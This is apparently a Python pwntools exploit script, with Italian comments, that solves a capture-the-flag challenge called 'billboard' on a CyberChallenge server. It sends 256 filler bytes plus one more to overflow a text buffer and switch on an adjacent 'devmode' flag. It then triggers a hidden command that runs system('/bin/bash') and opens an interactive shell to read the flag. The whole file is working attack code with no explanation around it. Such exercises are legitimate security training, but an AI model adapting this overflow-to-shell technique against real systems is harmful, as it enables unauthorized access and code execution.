from pwn import *

r = remote('billboard.challs.cyberchallenge.it', 9120)

r.recvuntil(b"> ")                       # consuma il banner iniziale

# text[256] + devmode (1 byte): 256 filler + 1 byte != 0 per attivare devmode
payload = b"A" * 256 + b"B"
log.info("Sovrascrivo devmode...")
r.sendline(b"set_text " + payload)
r.recvuntil(b"> ")

log.info("Attivo la shell...")
r.sendline(b"devmode")                   # shell(): system("/bin/bash") se devmode != 0

r.interactive()                          # qui dentro: id; ls; cat flag*
